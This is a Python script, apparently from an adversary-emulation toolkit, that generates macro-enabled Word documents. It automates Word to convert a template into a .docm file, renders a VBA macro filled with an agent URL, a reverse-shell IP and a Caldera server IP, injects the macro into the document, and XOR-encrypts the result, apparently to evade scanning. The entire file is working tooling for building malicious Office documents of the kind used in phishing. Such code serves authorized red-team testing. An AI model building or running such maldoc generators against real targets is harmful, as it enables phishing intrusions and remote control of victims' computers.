import os
import sys
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import win32com.client as win32
import yaml
from jinja2 import Template

from utils.xor import encrypt_file, load_xor_key

cfg = None
project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
config_file = os.path.join(project_dir, "config.yml")
template_dir = os.path.join(project_dir, "templates")
output_dir = os.path.join(project_dir, "output")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)


def load_word_template(template_path):
    # Use a fresh Word instance.  Reusing an existing automation instance can
    # leave Documents.Open returning an empty proxy after a previous crash.
    app = win32.DispatchEx("Word.Application")
    app.Visible = False
    app.DisplayAlerts = 0
    try:
        absolute_template = os.path.abspath(template_path)
        # Documents.Add expects a Word template (normally .dot/.dotx), not a
        # regular .docx document. Open the .docx as the source document and
        # let the caller save a separate .docm copy below.
        # Word does not necessarily show its "Open and Repair" prompt when it
        # is automated (and alerts are disabled). Request repair explicitly.
        # This also handles templates that are valid ZIP packages but contain
        # OOXML Word cannot parse normally.
        doc = app.Documents.Open(
            FileName=absolute_template,
            ConfirmConversions=False,
            ReadOnly=False,
            AddToRecentFiles=False,
            OpenAndRepair=True,
        )
    except Exception:
        app.Quit()
        raise

    if doc is None or not hasattr(doc, "SaveAs"):
        app.Quit()
        raise RuntimeError(
            f"Microsoft Word opened but did not return a document for "
            f"'{template_path}'. Verify that the template is valid and Word "
            f"can open it interactively."
        )
    return app, doc


def insert_macro_from_file(macro_path, target_doc):
    with open(macro_path, "r") as macro_file:
        macro_template = Template(macro_file.read())

    # Add the value from cfg["app"]["agent_url"] to the template
    rendered_macro = macro_template.render(
        agent_url=cfg["app"]["macros"]["agent_url"],
        reverse_shell_ip=cfg["app"]["macros"]["reverse_shell_ip"],
        caldera_ip=cfg["app"]["macros"]["caldera_ip"],
    )

    target_vba_project = target_doc.VBProject
    target_vba_project.VBComponents("ThisDocument").CodeModule.AddFromString(
        rendered_macro
    )


def get_template_path(template_name):
    if os.path.basename(template_name) != template_name:
        raise ValueError("Template must be a filename from templates/files/ms_office")

    template_path = os.path.join(template_dir, "files", "ms_office", template_name)
    if not os.path.isfile(template_path):
        raise FileNotFoundError(f"Template not found: {template_path}")

    return template_path


def get_macro_path(macro_name):
    if os.path.basename(macro_name) != macro_name:
        raise ValueError("Macro must be a filename from templates/macros/ms_office")

    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
    if not os.path.isfile(macro_path):
        raise FileNotFoundError(f"Macro not found: {macro_path}")

    return macro_path


def main(template_name, macro_name):
    template_path = get_template_path(template_name)
    macro_path = get_macro_path(macro_name)

    # Load the Word template (template with the associated macro)
    word_app, template_doc = load_word_template(template_path)
    new_doc = None
    try:
        # Save the new document in the output folder
        os.makedirs(output_dir, exist_ok=True)
        new_doc_path = os.path.join(
            output_dir, os.path.splitext(os.path.basename(template_name))[0]
        ) + ".docm"
        template_doc.SaveAs(new_doc_path, FileFormat=13)
        template_doc.Close()

        # Open the newly created document
        new_doc = word_app.Documents.Open(new_doc_path)
        if new_doc is None:
            raise RuntimeError(f"Word could not reopen generated file '{new_doc_path}'.")

        insert_macro_from_file(macro_path, new_doc)
        new_doc.Save()
    finally:
        if new_doc is not None:
            new_doc.Close(False)
        elif template_doc is not None:
            template_doc.Close(False)
        word_app.Quit()

    xored_path = encrypt_file(Path(new_doc_path), load_xor_key(Path(project_dir)))
    print(f"XORed file: {xored_path}")
    return new_doc_path


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(
            "Usage: python generators/word_file_generator.py "
            "<template_name> <macro_name>"
        )
        sys.exit(1)

    template_name = sys.argv[1]
    macro_name = sys.argv[2]

    main(template_name, macro_name)
